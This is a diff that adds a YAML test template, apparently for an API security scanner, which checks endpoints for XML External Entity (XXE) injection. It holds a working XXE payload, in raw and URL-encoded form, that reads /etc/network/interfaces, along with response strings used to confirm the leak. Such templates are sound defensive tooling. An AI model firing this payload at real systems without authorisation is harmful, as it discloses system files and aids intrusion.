@@ -1,0 +1,133 @@
+id: XXE_REVEAL_NETWORK_CONFIG
+info:
+  name: "XML External Entity (XXE) test for revealing Network Configuration in API response"
+  description: >
+    "This test involves exploiting XML parsing vulnerabilities to extract and disclose sensitive network configuration details, potentially exposing critical information about the target system's connectivity and infrastructure."
+  details: >
+    "Executing an XML External Entity (XXE) test to unveil Network Configuration in API responses entails leveraging XML parsing weaknesses to extract intricate details about the target system's connectivity, providing insights into network architecture and potential vulnerabilities for further exploitation."
+  impact: >
+    "Successful XML External Entity (XXE) test for revealing Network Configuration in API response can lead to the unauthorized disclosure of critical network details, enabling potential security threats and aiding adversaries in crafting targeted attacks on the exposed infrastructure."
+  category:
+    name: INJECT
+    shortName: Injection Attacks
+    displayName: Injection Attacks (INJECT)
+  subCategory: XXE_REVEAL_NETWORK_CONFIG
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
+    - "https://www.akto.io/blog/xml-external-entity-attack"
+    - "https://www.akto.io/blog/xml-injection-vulnerability-examples-cheatsheet-and-prevention"
+  cwe:
+    - CWE-611
+    - CWE-827
+  cve:
+    - CVE-2022-42745
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  method:
+    contains_either:
+      - POST
+      - PUT
+      - PATCH
+  or:
+    - request_payload:
+        for_one:
+          key:
+            regex: .*
+            extract: changed_body_key
+    - query_param:
+        for_one:
+          key:
+            regex: .*
+            extract: changed_query_key
+wordLists:
+  payloads:
+    - "%3C%21DOCTYPE%20test%20%5B%3C%21ENTITY%20%25%20custom%20SYSTEM%20%5C%22file%3A%2F%2F%2Fetc%2Fnetwork%2Finterfaces%5C%22%3E%20%25custom%3B%5D%3E"
+    - "<!DOCTYPE test [<!ENTITY % custom SYSTEM \"file:///etc/network/interfaces\"> %custom;]>"
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_body_param: 
+            changed_body_key:  ${payloads}
+        - modify_query_param: 
+            changed_query_key:  ${payloads}
+validate:
+  response_payload:
+    contains_all:
+      - inet
+      - iface
+      - auto
+      - allow-hotplug
+      - source
+      - network
+      - interfaces
+      - etc
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+      - Attention Required!
+      - CloudFlare
+      - Sorry, you have been blocked
